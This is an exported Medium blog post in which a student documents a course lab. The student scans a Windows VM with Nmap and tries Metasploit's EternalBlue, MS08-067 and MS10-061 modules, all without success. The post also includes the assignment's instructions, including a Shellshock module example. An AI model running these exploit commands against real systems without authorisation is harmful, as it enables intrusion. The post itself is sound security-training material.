<div>

# Unveiling Network Vulnerabilities: A Penetration Testing Journey with Nmap and Metasploit {#unveiling-network-vulnerabilities-a-penetration-testing-journey-with-nmap-and-metasploit .p-name}

</div>

::: {.section .p-summary field="subtitle"}
Objective
:::

::: {.section .e-content field="body"}
::: {#95a0 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Unveiling Network Vulnerabilities: A Penetration Testing Journey with Nmap and Metasploit {#24f4 .graf .graf--h3 .graf--leading .graf--title name="24f4"}

<figure id="b566" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*aTkR1Yt4lvAbee0wX8AaGg.png"
class="graf-image" data-image-id="1*aTkR1Yt4lvAbee0wX8AaGg.png"
data-width="978" data-height="641" data-is-featured="true" />
</figure>

**Objective**

The objective of this activity was to perform a vulnerability assessment
and basic penetration testing on a fictional network for **CyberTech
Solutions**. The task involved scanning the network using **Nmap**,
identifying vulnerabilities, and attempting to exploit one of the
discovered vulnerabilities using **Metasploit**.

**1. Environment Setup**

**1.1 Installing Windows on VMware**

-   [**VMware Installation**: I set up a **Windows VM** on **VMware
    Workstation** for testing purposes. The Windows version was selected
    as one that is vulnerable to the **MS17--010 (EternalBlue)**
    exploit.]{#7dee}

<figure id="9c63" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/1*Hot2Gy4re2xbmBa_Ait3ig.png"
class="graf-image" data-image-id="1*Hot2Gy4re2xbmBa_Ait3ig.png"
data-width="975" data-height="468" />
</figure>

-   [**Windows Installation**: Followed the standard procedure for
    installing Windows on the virtual machine.]{#4ca5}

<figure id="abd0" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/1*_iBcLilIWcF6uI4_vEsNtQ.png"
class="graf-image" data-image-id="1*_iBcLilIWcF6uI4_vEsNtQ.png"
data-width="975" data-height="469" />
</figure>

**1.2 Configuring Networking**

-   [**Network Configuration**: After Windows installation, I configured
    the network settings to ensure both the **Windows VM** (IP:
    192.168.158.129) and **Kali Linux VM** (IP: 192.168.158.100) were on
    the same subnet.]{#9c1e}
-   [**Changed Subnet IP**: I modified the network adapter settings in
    **VMware** to place both systems in the same network.]{#e103}

**Current Window ip address**:

<figure id="148a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*Y4lPsyrJ1ZCzthhlQVqhsg.png"
class="graf-image" data-image-id="1*Y4lPsyrJ1ZCzthhlQVqhsg.png"
data-width="975" data-height="519" />
</figure>

**Current kali-linux ip address**

<figure id="511e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*v4bHyXLimEKwIrMFAQw8Kw.png"
class="graf-image" data-image-id="1*v4bHyXLimEKwIrMFAQw8Kw.png"
data-width="975" data-height="512" />
</figure>

-   [**Network Adapter Mode**: Set the network adapter to **NAT** mode
    to ensure both systems were on the same network.]{#3f3f}

<figure id="4a11" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/1*uCzCVSGC_G1oehsNvRr1ug.png"
class="graf-image" data-image-id="1*uCzCVSGC_G1oehsNvRr1ug.png"
data-width="914" data-height="850" />
</figure>

**1.3 Verifying Network Communication**

-   [**Ping Test**: To verify network communication between the two
    systems, I performed a **ping test** from **Kali Linux** to
    **Windows** using the following command:]{#1b1e}

*ping 192.168.158.129*

<figure id="b8e0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*Im_ZaDiY-mj_QpAHW0XTuw.png"
class="graf-image" data-image-id="1*Im_ZaDiY-mj_QpAHW0XTuw.png"
data-width="975" data-height="254" />
</figure>

-   [**Ping Test**: To verify network communication between the two
    systems, I performed a **ping test** from Windows **to** **kali
    linux** using the following command:]{#0bb4}

*ping 192.168.158.100*

<figure id="6591" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*wx07_bBSP23ys3vJ3Zy7xQ.png"
class="graf-image" data-image-id="1*wx07_bBSP23ys3vJ3Zy7xQ.png"
data-width="975" data-height="418" />
</figure>

The successful response confirmed that the two systems were able to
communicate.

**1.4 Modifying Firewall Rules**

-   [**Disabling Firewall on Windows**: The default firewall on Windows
    could block incoming connections, so I disabled it temporarily to
    enable the exploit to work:]{#1e33}

<figure id="cd1d" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/1*zvzrcGn-ugwvjigJNeHl_w.png"
class="graf-image" data-image-id="1*zvzrcGn-ugwvjigJNeHl_w.png"
data-width="975" data-height="562" />
</figure>

**2. Activity 1: Individual Hands-On Activity**

**Objective**

In this activity, I performed a **vulnerability assessment** and
**penetration testing** on a fictional network belonging to **CyberTech
Solutions**. I used **Nmap** to scan for vulnerabilities and
**Metasploit** to attempt an exploitation of one of the discovered
weaknesses.

**Step 2: Conduct a Vulnerability Assessment Using Nmap**

1.  [**Nmap Installation and Execution**: Since I was using **Kali
    Linux**, **Nmap** was already pre-installed. I ran the following
    **Nmap** scan to identify open ports and services on the **Windows**
    machine (IP: 192.168.158.129):]{#c4b4}

*nmap -sS -sV 192.168.158.129*

<figure id="549c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*xdohtUxdmK_BKNrLtj9TsQ.png"
class="graf-image" data-image-id="1*xdohtUxdmK_BKNrLtj9TsQ.png"
data-width="975" data-height="415" />
</figure>

This performed a **SYN scan** and **service version detection**,
identifying the following services:

-   [**Port 139**: **netbios-ssn** (Microsoft Windows
    netbios-ssn)]{#8da9}
-   [**Port 445**: **microsoft-ds** (Microsoft Windows 7--10
    microsoft-ds)]{#555f}
-   [**Port 5357**: **http** (Microsoft HTTPAPI httpd 2.0)]{#b173}

1.  [**Analysis**: Based on the Nmap scan results, I noted the following
    potential vulnerabilities:]{#7c2e}

-   [**Port 445**: This port is used for **SMB** and is often targeted
    by exploits such as **EternalBlue**.]{#4a39}
-   [**Port 5357**: This port runs **Microsoft HTTPAPI** and could
    potentially be vulnerable to various HTTP-based attacks.]{#7ded}

*nmap -p -A 192.168.158.129*

<figure id="996c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*PV7PTsfzzD1VCJVSWUINwg.png"
class="graf-image" data-image-id="1*PV7PTsfzzD1VCJVSWUINwg.png"
data-width="975" data-height="516" />
</figure>

-p-: This will scan all 65535 ports on the target machine.

-A: This enables aggressive scan options which include OS detection,
version detection, script scanning, and traceroute. This will help in
identifying potential vulnerabilities in the services running on open
ports.

**Step 3: Conduct a Basic Penetration Test Using Metasploit**

**1. Launch Metasploit:** I launched Metasploit Framework by executing
the following command:

Msfconsole

<figure id="360c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*C1PU2XcyqSreHGrZUKJFYg.png"
class="graf-image" data-image-id="1*C1PU2XcyqSreHGrZUKJFYg.png"
data-width="919" data-height="584" />
</figure>

opened the Metasploit console for further exploitation.

**2. Selecting and Configuring Exploit (MS17--010 EternalBlue):** After
performing reconnaissance and identifying the potential SMB
vulnerability, I selected the **EternalBlue** exploit (**MS17--010**)
from Metasploit:

use exploit/windows/smb/ms17_010_eternalblue

<figure id="4855" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*MS9HZfsFpVjnk4fyu-NnxA.png"
class="graf-image" data-image-id="1*MS9HZfsFpVjnk4fyu-NnxA.png"
data-width="973" data-height="601" />
</figure>

set RHOST 192.168.158.129

set LHOST 192.168.158.100

set LPORT 4444

<figure id="1d9b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*1zkKPvunB5kQS3pAPWSU1w.png"
class="graf-image" data-image-id="1*1zkKPvunB5kQS3pAPWSU1w.png"
data-width="882" data-height="700" />
</figure>

-   [The **RHOST** was set to the target IP (192.168.158.129), and
    **LHOST** was set to my Kali Linux IP (192.168.158.100).]{#cfac}
-   [The **LPORT** was configured to **4444**, which is a standard port
    for reverse TCP connections.]{#5369}

**3. Exploitation Attempt:** Once configured, I ran the following
command to attempt the exploitation:

Exploit:

<figure id="57ff" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*5fgNV6OXnjIa3cTi9o-hYw.png"
class="graf-image" data-image-id="1*5fgNV6OXnjIa3cTi9o-hYw.png"
data-width="970" data-height="335" />
</figure>

The system attempted to connect back, but there were issues, and no
session was created. After analyzing the error messages, I found that
the target system might not have been vulnerable to this exploit, either
due to patches or system configuration.

**4. Alternate Exploitation Attempts:** I also attempted other exploits
such as **MS08--067** and **MS10--061**; however, these did not yield
successful results either. This could be due to the target system being
patched or properly secured.

**3. Conclusion:**

The penetration test on the target system revealed that despite several
vulnerabilities (such as those associated with SMB), the system was
either patched or configured to prevent exploitation of known
vulnerabilities. While common SMB vulnerabilities were detected in the
Nmap scan, attempts to exploit these vulnerabilities through
**Metasploit** did not result in a successful session.

**Key Findings:**

-   [The target machine was running several open ports, including 445
    (SMB), which could have been exploited using vulnerabilities such as
    **EternalBlue** (MS17--010).]{#d448}
-   [Network communication was verified successfully between Kali Linux
    and the Windows VM.]{#f791}
-   [**Metasploit** exploits did not successfully compromise the target
    system, possibly due to patches or security configurations.]{#3193}

**Recommendations:**

-   [Ensure that the target system is regularly updated and patched to
    mitigate the risk of well-known exploits such as
    **EternalBlue**.]{#e7c0}
-   [Consider implementing additional security controls such as
    firewalls and intrusion detection systems (IDS) to protect against
    unauthorized access attempts.]{#9804}
-   [Perform further vulnerability assessments using different tools and
    techniques to identify any weak points that might have been missed
    in this test.]{#dd16}

n/b. the topic is not yet closed I will keep searching for ways to
exploit it

trying to solve the assignment below and meeting the objective
**Activity 1: Individual Hands-On Activity**

**Objective:**

In this activity, you will conduct a **vulnerability assessment** and a
**basic penetration test** on a fictional network for **CyberTech
Solutions** using **Nmap** and **Metasploit**. You will scan the network
for vulnerabilities, identify weaknesses, and attempt to exploit one of
the discovered vulnerabilities.

**Step-by-Step Guide for Individual Hands-On Activity:**

**Step 1: Set Up the Testing Environment**

-   [**Option 1 (Local Tool)**: Install **Kali Linux**
    ([https://www.kali.org/Links to an external
    site.](https://www.kali.org/){.markup--anchor .markup--li-anchor
    data-href="https://www.kali.org/" rel="noopener" target="_blank"}),
    a popular Linux distribution for penetration testing that comes
    pre-installed with tools like **Nmap** and **Metasploit**.]{#93c0}
-   [**Option 2 (Web-Based Tool)**: Use **TryHackMe**
    ([https://tryhackme.com/Links to an external
    site.](https://tryhackme.com/){.markup--anchor .markup--li-anchor
    data-href="https://tryhackme.com/" rel="noopener" target="_blank"})
    or **Hack The Box** ([https://www.hackthebox.com/Links to an
    external site.](https://www.hackthebox.com/){.markup--anchor
    .markup--li-anchor data-href="https://www.hackthebox.com/"
    rel="noopener" target="_blank"}), both of which provide virtual
    environments for practicing penetration testing in a controlled,
    legal setting.]{#a804}

**Step 2: Conduct a Vulnerability Assessment Using Nmap**

1.  [**Install and Open Nmap**:]{#8623}

-   [If using **Kali Linux**, Nmap is pre-installed. If using another
    system, download and install Nmap from
    [**https://nmap.org/download.html**.](https://nmap.org/download.html.){.markup--anchor
    .markup--li-anchor data-href="https://nmap.org/download.html."
    rel="noopener" target="_blank"}]{#8d1d}

1.  [**Scan the Target Network**:]{#54c8}

-   [Open a terminal in **Kali Linux** or your environment of
    choice.]{#1f5d}
-   [Run an **Nmap scan** on the target network to identify open ports
    and services. The fictional target IP address for **CyberTech
    Solutions** is 192.168.1.100.]{#0660}
-   [Command: nmap -sS -sV 192.168.1.100]{#c65f}
-   [This will perform a **SYN scan** and **service version detection**
    to identify the services running on the target machine.]{#1f49}

1.  [**Analyze the Results**:]{#3005}

-   [Review the scan output for **open ports** (e.g., HTTP on port 80,
    SSH on port 22).]{#e4f0}
-   [Identify services that may have known vulnerabilities (e.g., old
    versions of SSH or Apache).]{#0b3d}

1.  [**Document the Vulnerabilities**:]{#b2cf}

-   [Based on the Nmap scan, document any potential vulnerabilities
    (e.g., open ports, outdated services) that could be
    exploited.]{#7420}

**Step 3: Conduct a Basic Penetration Test Using Metasploit**

1.  [**Launch Metasploit**:]{#7b72}

-   [If using **Kali Linux**, open a terminal and launch Metasploit with
    the command: msfconsole.]{#6732}

1.  [**Search for Exploits**:]{#9c7c}

-   [Use Metasploit to search for an exploit based on the vulnerable
    service you identified during the Nmap scan.]{#25c3}
-   [Command: search exploit name]{#924e}
-   [For example, if the target is running an old version of **Apache**,
    you can search for apache exploits.]{#850c}

1.  [**Choose and Configure the Exploit**:]{#d6d0}

-   [Once you have identified a relevant exploit, load it with the use
    command. For example:]{#89fe}
-   [Command: use
    exploit/multi/http/apache_mod_cgi_bash_env_exec]{#d4cf}
-   [Set the target's IP address and port number (based on the Nmap scan
    results):]{#04c3}
-   [Command: set RHOST 192.168.1.100]{#a229}
-   [Command: set RPORT 80]{#0311}

1.  [**Launch the Exploit**:]{#361c}

-   [Execute the exploit by running the exploit command. Metasploit will
    attempt to exploit the vulnerability and gain access to the target
    system.]{#b6ab}

1.  [**Document the Results**:]{#f6e4}

-   [If the exploit is successful, document what access was gained
    (e.g., shell access, sensitive data) and the steps used to achieve
    it.]{#642f}
-   [Take screenshots of the Nmap scan results, the Metasploit commands,
    and the successful exploitation.]{#d04c}

**Step 4: Report and Mitigation**

-   [Write a brief report summarizing the vulnerabilities identified
    during the Nmap scan and the results of the penetration test.
    Include mitigation recommendations to fix the identified issues
    (e.g., updating software, closing unused ports).]{#83b5}

**Graded Deliverable**:

-   [Submit a **500-word report** that includes:]{#a880}
-   [Screenshots of the **Nmap scan results** showing the identified
    vulnerabilities.]{#eb3f}

Details of the **Metasploit exploitation** attempt, including the steps
and screenshots
:::
:::
:::
:::

By [Kiplagatkelvin](https://medium.com/@kiplagatkelvin034){.p-author
.h-card} on [January 8, 2025](https://medium.com/p/2e824da0b630).

[Canonical
link](https://medium.com/@kiplagatkelvin034/unveiling-network-vulnerabilities-a-penetration-testing-journey-with-nmap-and-metasploit-2e824da0b630){.p-canonical}

Exported from [Medium](https://medium.com) on February 13, 2025.
